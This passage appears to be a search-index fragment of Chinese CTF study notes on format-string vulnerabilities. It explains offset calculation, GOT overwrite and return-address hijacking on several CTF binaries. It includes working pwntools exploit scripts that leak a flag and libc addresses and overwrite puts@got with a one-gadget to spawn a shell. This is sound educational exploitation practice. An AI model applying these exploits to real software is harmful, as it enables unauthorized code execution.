( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '% {} $' . format ( i ) new = '% {} $' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () fmtstr_payload \u76f4\u63a5\u5f97\u5230\u7684 payload \u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4 printf \u7684\u65f6\u5019 '\\x00' \u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools \u76ee\u524d\u6b63\u5728\u5f00\u53d1 fmt_payload \u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u9762 8 \u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9 payload \u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f offset = ( int )( math.ceil ( len ( payload ) / 8 .0 ) + 1 ) \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e '%order$hn' \u4e2d order \u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e 8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002 \u9898\u76ee \u00b6 SuCTF2018 - lock2 \uff08\u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2\uff09","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u7840\u4f8b\u5b50"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_1","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u7840\u4f8b\u5b50"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#64","text":"","title":"64 \u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_2","text":"\u5176\u5b9e 64 \u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c 32 \u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc7 64 \u4f4d\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f \u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002","title":"\u539f\u7406"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_3","text":"","title":"\u4f8b\u5b50"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_4","text":"\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2017 \u5e74\u7684 UIUCTF \u4e2d pwn200 GoodLuck \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2a flag.txt \u6587\u4ef6\u3002 \u279c 2017 -UIUCTF-pwn200-GoodLuck git: ( master ) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86 Canary\u3001NX \u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206 RELRO \u4fdd\u62a4\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_5","text":"\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0 ; j <= 21 ; ++ j ) { v5 = format [ j ]; if ( ! v5 || v11 [ j ] != v5 ) { puts ( \"You answered:\" ); printf ( format ); puts ( \" \\n But that was totally wrong lol get rekt\" ); fflush ( _bss_start ); result = 0 ; goto LABEL_11 ; } } \u53ef\u4ee5\u770b\u5230 flag \u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a 5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a 4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d 6 \u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt \u5b57\u7b26\u4e32\u5b58\u50a8\u5728 RDI \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5 fmt \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a 10\u3002\u800c fmt \u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684 order \u4e3a fmt \u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230 flag \u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528 https://github.com/scwuaptx/Pwngdb \u4e2d\u7684 fmtarg \u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987b break \u5728 printf \u5904\u3002 \u6765\u81ea resery \u5e08\u5085\u6ce8\u89e3\uff1a \u8fd9\u91cc\u7684 10 \u662f\u7531 5+5 \u5f97\u5230\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e24\u4e2a 5 \u662f\u4ece\u54ea\u91cc\u7684\u5f97\u5230\u7684\uff0c\u6211\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u524d\u9762\u7684 5\uff1a\u7531\u4e8e 64 \u4e3a\u7a0b\u5e8f\uff0c\u524d 64 \u4e2a\u53c2\u6570\u662f\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff0c\u5206\u522b\u662f rdi\uff0crsi\uff0crcx\uff0crdx\uff0cr8\uff0cr9\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u50a8\u5728 rdi \u4e2d\u7684\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u504f\u79fb\u5c31\u5e94\u8be5\u662f 5+flag \u5728\u6808\u4e2d\u7684\u504f\u79fb\uff0c\u5728\u6808\u4e2d\u7684\u504f\u79fb\u5c31\u5f88\u597d\u7406\u89e3\u4e86\u5c31\u662f 5\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 10 \u6ce8\u89e3 \u6211\u5b89\u88c5\u7684 Pwndbg \u5e76\u6ca1\u6709 fmtarg \uff0c\u53ef\u80fd\u662f\u7248\u672c\u4e0d\u5bf9\uff0c\u5982\u679c\u9700\u8981\u5b89\u88c5\u4e00\u4e0b gef \u63d2\u4ef6\u3002 \u4e24\u4e2a\u4f5c\u8005\u90fd\u89e3\u91ca\u4e86\u504f\u79fb 10 \u662f\u600e\u4e48\u8ba1\u7b97\u6765\uff0c\u4f46\u6211\u66f4\u559c\u6b22\u7684\u65b9\u6cd5\u662f**\u8f93\u5165\u4e00\u957f\u4e32 %p \u5f97\u51fa\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u76ee\u6807\u504f\u79fb\u6216\u5730\u5740**\u3002 $ ./goodluck what ' s the flag bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p You answered: bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161 But that was totally wrong lol get rekt 0x602830 \u662f\u7b2c 7 \u4f4d\u3002\u4e3a\u4ec0\u4e48\u6cc4\u9732\u7684\u4e0d\u662f 0x6262626262626262 \uff1f\u524d\u9762\u63d0\u5230\u4e86\uff0c64 \u4f4d\u7cfb\u7edf\u7684\u524d\u516d\u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\u7684\uff0c\u800c bbbbbbbb \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u81ea\u7136\u5728\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\uff0c0x602830 \u5c31\u662f\u5b58\u50a8\u7684\u5bc4\u5b58\u5668\u5730\u5740\u3002\u600e\u4e48\u83b7\u5f97\u8fd9\u4e2a\u5730\u5740\uff1fgdb \u8c03\u8bd5\u65ad\u70b9\u6253\u5728 printf \u51fd\u6570\uff1a \u8fd9\u6837\u5f97\u51fa\u6700\u540e\u7684 flag \u504f\u79fb\u4e3a 10 \u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_6","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # \u8fd9\u4e2a\u5e93\u6ca1\u6709\u7528\u5230\u53ef\u4ee5\u6ce8\u91ca\u6389 # from LibcSearcher import * goodluck = ELF ( './goodluck' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.sniperoj.cn' , 30017 ) else : sh = process ( './goodluck' ) payload = \"%9$s\" print payload ##gdb.attach(sh) sh . sendline ( payload ) print sh . recv () sh . interactive ()","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#hijack-got","text":"","title":"hijack GOT"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_7","text":"\u5728\u76ee\u524d\u7684 C \u7a0b\u5e8f\u4e2d\uff0clibc \u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7 GOT \u8868\u6765\u8df3\u8f6c\u7684\uff08\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\uff09\u3002\u6b64\u5916\uff0c\u5728\u6ca1\u6709\u5f00\u542f RELRO \u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2a libc \u7684\u51fd\u6570\u5bf9\u5e94\u7684 GOT \u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2a libc \u51fd\u6570\u7684 GOT \u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 printf \u7684 got \u8868\u9879\u5185\u5bb9\u4e3a system \u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884c printf \u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570 A \u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570 B \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570 A \u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\uff08\u56e0\u4e3a\u8fd9\u7c7b\u51fd\u6570\u4f1a\u5728\u7a0b\u5e8f\u6e90\u7801\u4e2d\u4f7f\u7528\u5230\uff0c\u6240\u4ee5\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u4ece elf \u6587\u4ef6\u4e2d\u8bfb\u53d6\uff09 \u786e\u5b9a\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570 B \u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite \u51fd\u6570\uff08\u5e38\u89c1\uff09 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\uff08\u5e38\u89c1\uff09 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset","title":"\u539f\u7406"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_8","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 CCTF \u4e2d\u7684 pwn3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_9","text":"\u5982\u4e0b \u279c 2016 -CCTF-pwn3 git: ( master ) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002RELRO \u662f\u90e8\u5206\u4fdd\u62a4\uff0c\u8fd9\u79cd\u72b6\u6001\u4e0b\u53ef\u4ee5\u4fee\u6539 GOT \u8868\uff0c\u5982\u679c\u662f FULL \u5219\u4e0d\u884c\u3002\u53e6\u5916\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542f ASLR \u4fdd\u62a4\u7684\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_10","text":"\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684 ftp\uff0c\u5177\u6709 get\uff0cput\uff0cdir \u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728 get \u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file () { char dest ; // [sp+1Ch] [bp-FCh]@5 char s1 ; // [sp+E4h] [bp-34h]@1 char * i ; // [sp+10Ch] [bp-Ch]@3 printf ( \"enter the file name you want to get:\" ); __isoc99_scanf ( \"%40s\" , & s1 ); if ( ! strncmp ( & s1 , \"flag\" , 4u ) ) puts ( \"too young, too simple\" ); for ( i = ( char * ) file_head ; i ; i = ( char * ) * (( _DWORD * ) i + 60 ) ) { if ( ! strcmp ( i , & s1 ) ) { strcpy ( & dest , i + 0x28 ); //\u5c06\u5185\u5bb9\u590d\u5236\u5230dest return printf ( & dest ); //\u8f93\u51fadest\u5185\u5bb9 } } return printf ( & dest ); }","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_11","text":"\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u601d\u8def"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_12","text":"\u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : filename.py from pwn import * context . log_level = 'debug' p = process ( \"./pwn3\" ) elf = ELF ( \"./pwn3\" ) libc = ELF ( \"./libc.so\" ) def creat ( name , content ): p . recvuntil ( \"ftp>\" ) p . sendline ( \"put\" ) p . recvuntil ( \"upload:\" ) p . sendline ( name ) p . recvuntil ( \"content:\" ) p . sendline ( content ) def show ( name ): p . recvuntil ( \"ftp>\" ) p . sendline ( \"get\" ) p . recvuntil ( \"get:\" ) p . sendline ( name ) def showlist (): p . recvuntil ( \"ftp>\" ) p . sendline ( \"dir\" ) name = \"rxraclhm\" puts_got = elf . got [ 'puts' ] log . info ( \"puts_got:\" + hex ( puts_got )) p . recvuntil ( \"Rainism):\" ) p . sendline ( name ) # leak libc payload = \"%8$s\" + p32 ( puts_got ) creat ( 'aaaa' , payload ) show ( 'aaaa' ) puts_leak = u32 ( p . recv ( 4 )) log . info ( \"puts_leak:\" + hex ( puts_leak )) libc_base = puts_leak - libc . symbols [ 'puts' ] log . info ( \"libc_base:\" + hex ( libc_base )) system = libc_base + libc . symbols [ 'system' ] log . info ( \"system:\" + hex ( system )) binsh = libc_base + libc . search ( '/bin/sh' ) . next () log . info ( \"binsh:\" + hex ( binsh )) onegadget = libc_base + 0x3ac62 log . info ( \"onegadget:\" + hex ( onegadget )) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload ( 7 , { puts_got : onegadget }) creat ( 'bbbb' , payload ) show ( 'bbbb' ) p . interactive () exp \u66ff\u6362\u6211\u5199\u5f97\u7248\u672c\uff0c\u8fd9\u6761\u9898\u76ee\u7684\u5b8c\u6574 WP \uff1a 2016_CCTF_pwn3_writeup \u6ce8\u610f \u6211\u5728\u83b7\u53d6 puts \u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f 8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d 4 \u4e2a\u5b57\u8282\u5c31\u662f puts \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f 7\u3002 \u6ce8\u89e3 \uff1a\u7ed3\u5408 payload \u6765\u770b\uff1a payload = \"%8$s\" + p32(puts_got) \uff0c %8$S \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 7\uff1b p32(puts_got) \u957f\u5ea6\u4e3a 0x4 \uff0c\u504f\u79fb\u4e3a 8 ; \u8fd9\u91cc\u6211\u5229\u7528\u4e86 pwntools \u4e2d\u7684 fmtstr_payload \u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91cc fmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#hijack-retaddr","text":"","title":"hijack retaddr"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_13","text":"\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002","title":"\u539f\u7406"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_14","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 \u4e09\u4e2a\u767d\u5e3d - pwnme_k0 \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002","title":"\u4f8b\u5b50"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_15","text":"\u279c \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git:(master) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4ee5\u53ca Full RELRO \u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684 got \u8868\u4e86\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/#_16","text":"\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int __usercall sub_400B07 @ < eax > ( char format @ < dil > , char formata , __int64 a3 , char a4 ) { write ( 0 , \"Welc0me to sangebaimao! \\n \" , 0x1AuLL ); printf ( & formata , \"Welc0me to sangebaimao! \\n \" ); return printf ( & a4 + 4 ); } \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a &a4 + 